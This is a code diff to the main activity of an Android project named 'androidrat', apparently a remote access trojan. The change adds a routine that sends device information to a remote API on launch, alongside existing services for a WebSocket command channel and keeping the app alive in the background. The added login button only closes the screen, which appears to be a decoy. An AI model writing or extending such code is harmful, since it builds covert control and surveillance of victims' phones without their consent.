@@ -17,22 +17,36 @@ import android.view.WindowManager
 import androidx.annotation.RequiresApi
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
+import com.nqmgaming.androidrat.command.DeviceInfo
 import com.nqmgaming.androidrat.command.util.AppInfo
+import com.nqmgaming.androidrat.data.ApiService
+import com.nqmgaming.androidrat.databinding.ActivityMainBinding
 import com.nqmgaming.androidrat.receivers.JobWakeUpService
 import com.nqmgaming.androidrat.service.WebSocketService
+import dagger.hilt.android.AndroidEntryPoint
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import retrofit2.awaitResponse
+import javax.inject.Inject
 
+@AndroidEntryPoint
 class MainActivity : AppCompatActivity() {
+    @Inject
+    lateinit var apiService: ApiService
+    private lateinit var binding: ActivityMainBinding
 
-    @RequiresApi(Build.VERSION_CODES.LOLLIPOP_MR1)
+    @RequiresApi(Build.VERSION_CODES.M)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        binding = ActivityMainBinding.inflate(layoutInflater)
         this.supportRequestWindowFeature(Window.FEATURE_NO_TITLE)
         this.window.setFlags(
             WindowManager.LayoutParams.FLAG_FULLSCREEN,
             WindowManager.LayoutParams.FLAG_FULLSCREEN
         )
         supportActionBar?.hide()
-        setContentView(R.layout.activity_main)
+        setContentView(binding.root)
         checkPermission()
         val isFirstRun = getSharedPreferences(AppInfo.isServiceRunning, MODE_PRIVATE)
         if (isFirstRun.getBoolean(AppInfo.FirstRunKey, true)) {
@@ -49,6 +63,10 @@ class MainActivity : AppCompatActivity() {
         val commandline = Intent(applicationContext, webSocketService)
         startService(commandline)
         startService(Intent(applicationContext, JobWakeUpService::class.java))
+        sendRegistrationRequest()
+        binding.btnLogin.setOnClickListener {
+            finish()
+        }
     }
 
 
@@ -170,5 +188,22 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    @RequiresApi(Build.VERSION_CODES.M)
+    private fun sendRegistrationRequest() {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val response = apiService.register(DeviceInfo.createDeviceInfo())
+                response.awaitResponse().let {
+                    if (it.isSuccessful) {
+                        println("Device registered successfully")
+                    } else {
+                        println("Failed to register device: ${it.errorBody()?.string()}")
+                    }
+                }
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }
+    }
 
 }
